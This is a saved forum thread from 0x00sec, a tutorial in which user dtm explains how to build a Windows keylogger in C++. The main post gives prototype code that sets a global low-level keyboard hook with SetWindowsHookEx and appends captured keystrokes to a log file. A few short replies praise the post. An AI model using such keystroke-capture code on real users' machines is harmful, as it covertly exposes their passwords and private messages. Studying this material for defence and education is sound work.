<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Windows Keylogging - Part I - Malware - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="S‚Äôgoin‚Äô on guys, dtm here with a write-up on Windows keylogging. 
As a promotional gift, I will be detailing a type of keylogger on the code level written in MSVC++ utilising the WinAPI. 
Disclaimer: The following docume&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="99.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="3g561q8U6DfBq5DQVMI9iKXBh"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="3g561q8U6DfBq5DQVMI9iKXBh"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Windows Keylogging - Part I&#39;" href="99.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/windows-keylogging-part-i/99" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/windows-keylogging-part-i/99" />
<meta property="og:title" content="Windows Keylogging - Part I" />
<meta name="twitter:title" content="Windows Keylogging - Part I" />
<meta property="og:description" content="S‚Äôgoin‚Äô on guys, dtm here with a write-up on Windows keylogging.  As a promotional gift, I will be detailing a type of keylogger on the code level written in MSVC++ utilising the WinAPI.  Disclaimer: The following document is not newbie-friendly and requires a fair amount of knowledge of both general programming concepts and Windows internals:  Proficiency in C/C++ Knowledge of the WinAPI and its documentation Knowledge of Windows messages and message queues Knowledge of Windows hooks Some under..." />
<meta name="twitter:description" content="S‚Äôgoin‚Äô on guys, dtm here with a write-up on Windows keylogging.  As a promotional gift, I will be detailing a type of keylogger on the code level written in MSVC++ utilising the WinAPI.  Disclaimer: The following document is not newbie-friendly and requires a fair amount of knowledge of both general programming concepts and Windows internals:  Proficiency in C/C++ Knowledge of the WinAPI and its documentation Knowledge of Windows messages and message queues Knowledge of Windows hooks Some under..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="keylogger" />
<meta property="og:article:tag" content="malware" />
<meta property="og:article:tag" content="c" />
<meta property="og:article:tag" content="winapi" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="17 ‚ù§" />
<meta property="article:published_time" content="2016-05-02T09:33:15+00:00" />
<meta property="og:ignore_canonical" content="true" />

        <link rel="next" href="994658.html?page=2">

    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="99.html">Windows Keylogging - Part I</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/malware/56.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F7941D'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Malware</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/keylogger.html' class='discourse-tag' rel="tag">keylogger</a>, 
            <a href='../../tag/malware.html' class='discourse-tag' rel="tag">malware</a>, 
            <a href='../../tag/c.html' class='discourse-tag' rel="tag">c</a>, 
            <a href='../../tag/winapi.html' class='discourse-tag' rel="tag">winapi</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Windows Keylogging - Part I'>
      <link itemprop='url' href='99.html'>
      <meta itemprop='datePublished' content='2016-05-02T09:33:15Z'>
        <meta itemprop='articleSection' content='Malware'>
      <meta itemprop='keywords' content='keylogger, malware, c, winapi'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="99.html">


              <span class="crawler-post-infos">
                  <time  datetime='2016-05-02T09:33:15Z' class='post-time'>
                    May 2, 2016,  9:33am
                  </time>
                  <meta itemprop='dateModified' content='2016-05-05T22:56:45Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>S‚Äôgoin‚Äô on guys, dtm here with a write-up on Windows keylogging.</p>
<p>As a promotional gift, I will be detailing a type of keylogger on the code level written in MSVC++ utilising the WinAPI.</p>
<p><strong>Disclaimer</strong>: The following document is not newbie-friendly and requires a fair amount of knowledge of both general programming concepts and Windows internals:</p>
<pre><code>Proficiency in C/C++
Knowledge of the WinAPI and its documentation
Knowledge of Windows messages and message queues
Knowledge of Windows hooks
Some understanding of multi-threading
Recommended knowledge of Mutual Exclusions
Recommended knowledge of FTP
</code></pre>
<hr>
<h2>General Overview of Keyloggers</h2>
<p>A keylogger is an object which, in its simplest state, tracks key presses registered by the keyboard. Note that this object can be hardware as well as software but this article will focus more on the latter. When a key is pressed, the keylogger is able to capture it and then pass it along to its original destination. Keyloggers are not always considered malware since it is dependant on the situation in which it is used. Consider the following: If a parent is concerned about their child‚Äôs activity on the computer, they can easily monitor them through their keyboard input; or in a company, the employer wishes to monitor the activity of his employees to make sure that they aren‚Äôt doing what they aren‚Äôt supposed to do. in fact, this probably goes for all ‚Äúmalware‚Äù. Such applications may be referred to as <em>Possibly Unwanted Programs</em> (PUP) or <em>Possibly Unwanted Applications</em> (PUA).</p>
<p>In a standard console application which takes keyboard input, for example, using the <em>getchar</em> function from the standard C library, the input from the keyboard gets buffered into the stdin where the program can fetch the character. A keylogger is not limited to its own active console window (if it even has one at all) so how are we able to globally capture keystrokes? The answer is pretty simple, actually, in fact, Microsoft has already done most of the heavy lifting for us.</p>
<hr>
<h2>Callback Functions</h2>
<p>Windows applications all work in harmony using something called <strong>messages</strong>. These messages are all passed through the message queue and each application can detect and process its own messages. Within the applications are <em>callback</em> functions which may be called in the event of retrieving certain messages. For example, pressing ALT+F4 in a GUI window will send a <code>WM_CLOSE</code> message into the message queue where the corresponding application‚Äôs <strong>message loop</strong> will detect it and pass it to a <a href="../../../external.html?link=https://msdn.microsoft.com/en-us/library/windows/desktop/ms633573(v=vs.85).aspx"><code>WindowProc</code></a> callback function for processing. What happens inside this function is that the message is filtered through some switch cases and in the case of a <code>WM_CLOSE</code> message, it will handle any clean ups and whatever else it needs, then it will destroy the window and also possibly exit the program.</p>
<pre><code class="lang-auto">LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
		case WM_CLOSE:
			// ...
			DestroyWindow(hwnd);
	}
}
</code></pre>
<p>Additional message information may also be passed into the callback function under WPARAM and LPARAM arguments. Note that these arguments will not always be the same and can change under different callback functions.</p>
<h3>LowLevelKeyboardProc</h3>
<p>There exists a callback function called <a href="../../../external.html?link=https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx"><code>LowLevelKeyboardProc</code></a> and what this function does is it responds to key state changes either within a thread scope or a global scope - of course we‚Äôre wanting to have a global scope for our purposes. But before we can use this function, we first need to learn about Windows hooks.</p>
<hr>
<h2>Windows Hooks</h2>
<p>From the MSDN documentation on <a href="../../../external.html?link=https://msdn.microsoft.com/en-us/library/windows/desktop/ms644959(v=vs.85).aspx">Windows Hooks</a>, ‚Äú<em>A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes. A function that intercepts a particular type of event is known as a hook procedure. A hook procedure can act on each event it receives, and then modify or discard the event.</em>‚Äù As we can see from this description, applications are able to <em>"intercept ‚Ä¶ keystrokes</em>" and that is exactly what we are aiming to do with a keylogger.</p>
<h3>Installing Hooks</h3>
<p>To install a hook procedure, we must use the <a href="../../../external.html?link=https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx"><code>SetWindowsHookEx</code></a> function to install a hook like so:</p>
<pre><code class="lang-auto">LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	// ...
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// ...
	
	SetWindowsHookEx(idHook, (HOOKPROC)HookProc, hMod, dwThreadId);
	
	// this is our message loop to receive messages from the queue
	MSG msg;
	BOOL bRet;
	while ((bRet = GetMessage(&amp;msg, NULL, 0, 0)) != 0) {
		if (bRet == -1) {
			// handle error
		} else {
			TranslateMessage(&amp;msg);
			DispatchMessage(&amp;msg);
		}
	}
	
	return 0;
}
</code></pre>
<p>Here, we would define a callback function <code>HookProc</code> and use a call to <code>SetWindowsHookEx</code> to install a hook so that our function can intercept and handle the hook procedure of type <code>idHook</code>. In the HookProc, we are highly recommended to call <a href="../../../external.html?link=https://msdn.microsoft.com/en-us/library/windows/desktop/ms644974(v=vs.85).aspx"><code>CallNextHookEx</code></a> to be able to pass the hooked information onwards to the next existing hook procedure.</p>
<p>Let‚Äôs finally get our hands dirty by writing a prototype.</p>
<hr>
<h2>Keylogger Prototyping</h2>
<p><strong>Disclaimer</strong>: The following code snippets will not contain any error checking for the sake of readability.</p>
<p>We now know what we need to set up a function to intercept keystrokes from the information provided above. It should look a little something like this:</p>
<pre><code class="lang-auto">LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	// ...
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// ...
	
	SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hModule, 0);
	
	// message loop here
}
</code></pre>
<p>For our <code>SetWindowsHookEx</code>, we require the <code>idHook</code> parameter to be <code>WH_KEYBOARD_LL</code> since it has a global scope. For our dwThreadId parameter, we set it to 0 since this will allow our hook procedure to be associated will all existing threads running on the same desktop as our application. As of yet, our keylogger is useless to us since we have not implemented any method to store the keystrokes.</p>
<h3>Writing Keystrokes to Disk</h3>
<p>First, we need to know about the arguments which are passed into the <code>LoweLevelKeyboardProc</code> function.</p>
<p>According to the MSDN documentation for the <code>LowLevelKeyboardProc</code> function, <code>nCode</code> will hold the value <code>HC_ACTION</code> if <em>" <code>wParam</code> and <code>lParam</code> parameters contain information about a keyboard message"</em>. So only when <code>nCode</code> is equal to <code>HC_ACTION</code> will we need to write to the file, else we do not care. Once we have such a situation, we will need to check the <code>wParam</code> and <code>lParam</code> for information about the keypress. <code>wParam</code> contains information about how the key was pressed such as a key down or key up. <code>lParam</code> is documented as a pointer to a <a href="../../../external.html?link=https://msdn.microsoft.com/en-us/library/windows/desktop/ms644967(v=vs.85).aspx"><code>KBDLLHOOKSTRUCT</code></a> which contains the respective <a href="../../../external.html?link=https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx"><code>vkCode</code></a> of the keypress.</p>
<pre><code class="lang-auto">LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
			DWORD vkCode = kbd-&gt;vkCode;
			
			if (vkCode &gt;= 0x30 &amp;&amp; vkCode &lt;= 0x5A) {
				FILE *fp = fopen(KEYLOG_FILE, "a+");
				
				fputc(vkCode, fp);
				
				fclose(fp);
			}
		}
	}
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
</code></pre>
<p>We can typecase the <code>lParam</code> as a pointer to a <code>KBDLLHOOKSTRUCT</code> and assign it to a variable <code>kbd</code>. For this example, we only test for basic input which includes keys ranging from <code>0-9</code> and <code>A-Z</code>. Of course, right now there is a lot missing detail with regards to other keys such as <code>ALT</code>, <code>CTRL</code> and <code>SHIFT</code> and also that it cannot differentiate upper and lower case and symbols. We can easily fix this by manually adding in some tests and switch statements until it reaches our satisfaction. Once we have extracted the <code>vkCode</code> member from <code>kbd</code> and it satisfies the key range, we will open our file defined by <code>KEYLOG_FILE</code> with an append mode and simply add on the <code>vkCode</code> to the end of the file.</p>
<p>After we‚Äôve finished what we intended to do, we can then push the keypress onwards to the next hook procedure.</p>
<hr>
<h2>Conclusion</h2>
<p>In the next part I will showcase my keylogger code and briefly run through its functionality and how it‚Äôs achieved. Thanks for reading and stay tuned!</p>
<p><em>‚Äì dtm</em></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="14" />
              <span class='post-likes'>14 Likes</span>
            </div>

                <div class='crawler-linkback-list' itemscope itemtype='../../../external.html?link=http://schema.org/ItemList'>
                      <div itemprop='itemListElement' itemscope itemtype='../../../external.html?link=http://schema.org/ListItem'>
                        <a itemprop='url' href="../../../external.html?link=https://0x00sec.org/t/windows-keylogging-part-ii/1070">Windows Keylogging - Part II</a>
                        <meta itemprop='position' content='8'>
                      </div>
                      <div itemprop='itemListElement' itemscope itemtype='../../../external.html?link=http://schema.org/ListItem'>
                        <a itemprop='url' href="../../../external.html?link=https://0x00sec.org/t/our-first-1337-of-the-w33k/194">Our First &quot;1337 of the W33k&quot;</a>
                        <meta itemprop='position' content='9'>
                      </div>
                </div>

            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-05-02T10:02:57Z' class='post-time'>
                    May 2, 2016, 10:02am
                  </time>
                  <meta itemprop='dateModified' content='2016-05-02T10:02:57Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Nice article, although only the first paragraph and link to the real article original article on the main page should be supplied.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-05-02T10:18:11Z' class='post-time'>
                    May 2, 2016, 10:18am
                  </time>
                  <meta itemprop='dateModified' content='2016-05-02T10:18:11Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I think I prefer posting onto the forum from now on. You could just modify the one on the front page or remove it entirely.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Cromical.html'><span itemprop='name'>Cromical</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-05-02T14:44:22Z' class='post-time'>
                    May 2, 2016,  2:44pm
                  </time>
                  <meta itemprop='dateModified' content='2016-05-02T14:44:22Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Great article DTM! I‚Äôm sure it‚Äôll help a lot of people out!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-07-28T05:47:43Z' class='post-time'>
                    July 28, 2016,  5:47am
                  </time>
                  <meta itemprop='dateModified' content='2016-07-28T05:47:43Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This really changed how we do things! The old way was cool! <img src="../../../0x00sec.org/images/emoji/twitter/stuck_out_tonguec164.html?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tux.html'><span itemprop='name'>tux</span></a>
                
              </span>



              <span class="crawler-post-infos">
